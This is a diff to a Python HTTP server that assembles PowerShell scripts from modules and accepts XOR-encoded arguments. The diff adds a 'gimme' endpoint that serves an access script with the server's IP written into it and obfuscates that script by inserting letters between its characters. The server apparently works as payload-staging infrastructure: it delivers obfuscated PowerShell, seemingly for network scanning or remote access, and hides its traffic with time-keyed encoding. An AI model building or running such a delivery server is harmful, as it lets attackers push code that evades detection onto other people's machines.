@@ -1,4 +1,6 @@
 # import all functions from http.server module
+import socket
+import sys
 import traceback
 import ast
 from enum import Enum
@@ -14,6 +16,7 @@ import re
 
 # load module names and file paths as tuples
 module_files = [ (Path(f.path).stem, f.path) for f in os.scandir(os.path.join(os.getcwd(), "modules")) if f.is_file() ]
+server_address = "127.0.0.1"
 
 def encode(data: str) -> str:
     # key for XOR encoding is current minute
@@ -320,7 +323,7 @@ class Argument:
                 else:
                     ret_str += "$true },"
             else:
-                ret_str += "[PSCustomObject]@{ BASE_HOST = " + host + "; SUBN = 32; RESOLV = "
+                ret_str += "[PSCustomObject]@{ BASE_HOST = \"" + host + "\"; SUBN = 32; RESOLV = "
                 if host.replace(".", "").isnumeric():
                     ret_str += "$false },"
                 else:
@@ -335,20 +338,35 @@ class Argument:
 class RequestHandler(BaseHTTPRequestHandler):
     def __init__(self, *args):
         self.cur_arg = Argument()
+        self.getter_script = ""
+        self.encode_access()
         BaseHTTPRequestHandler.__init__(self, *args)
 
     def collect_script(self, arg_str):
         return self.cur_arg.process_args(arg_str)
 
+    def encode_access(self):
+        tmp_str = ""
+        alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
+        i = 0
+
+        with open("access_script.ps1", 'r') as f:
+            tmp_str = f.read()
+        tmp_str = tmp_str.replace('IP_ADDR_HERE', server_address)
+        for char in tmp_str:
+            self.getter_script += char
+            self.getter_script += alphabet[i%len(alphabet)]
+            i += 1
+
     def do_GET(self):
         query = urlparse(self.path).query
         query_components = dict(qc.split("=") for qc in query.split("&"))
-        if len(query_components) <= 0 or "args" not in query_components:
+        if len(query_components) <= 0:
             self.send_response(404)
             self.send_header('Content-type', 'text/plain')
             self.end_headers()
             self.wfile.write(b"no args\n")
-        else:
+        elif "args" in query_components:
             query_str = decode(query_components['args'])
             print(f"Query string: {query_str}")
             if len(query_str) > 0:
@@ -361,7 +379,11 @@ class RequestHandler(BaseHTTPRequestHandler):
                 self.send_header('Content-type', 'text/plain')
                 self.end_headers()
                 self.wfile.write(b"no args\n")
-
+        elif "gimme" in query_components:
+            self.send_response(200)
+            self.send_header('Content-type', 'text/plain')
+            self.end_headers()
+            self.wfile.write(bytearray(self.getter_script, 'ascii'))
 
 def run_server(server_class=HTTPServer, handler_class=RequestHandler, port=8000):
     server_addr = ('', port)
@@ -371,4 +393,10 @@ def run_server(server_class=HTTPServer, handler_class=RequestHandler, port=8000)
 
 if __name__ == "__main__":
     import pdb
+    if len(sys.argv) > 1:
+        try:
+            socket.inet_aton(sys.argv[1])
+            server_address = sys.argv[1]
+        except:
+            print(f"Invalid host IP address {sys.argv[1]}, using {server_address}")
     run_server()
